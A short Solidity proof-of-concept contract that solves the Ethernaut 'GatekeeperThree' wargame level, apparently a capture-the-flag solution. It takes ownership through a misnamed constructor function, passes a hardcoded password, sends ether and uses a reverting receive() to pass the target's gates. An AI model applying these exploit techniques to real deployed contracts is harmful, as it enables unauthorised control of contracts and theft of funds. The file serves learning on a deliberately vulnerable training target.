// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "Ethernaut/gatekeeperthree.sol";
contract GatekeeperThreePoc {
    GatekeeperThree target;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function exploit() public payable {
        uint256 password = 1726730014;
        target.getAllowance(password);
        target.construct0r();
        address(target).call{value: msg.value}("");
        target.enter();
    }

    receive() external payable {
      revert("Exploit successful");
    }
} 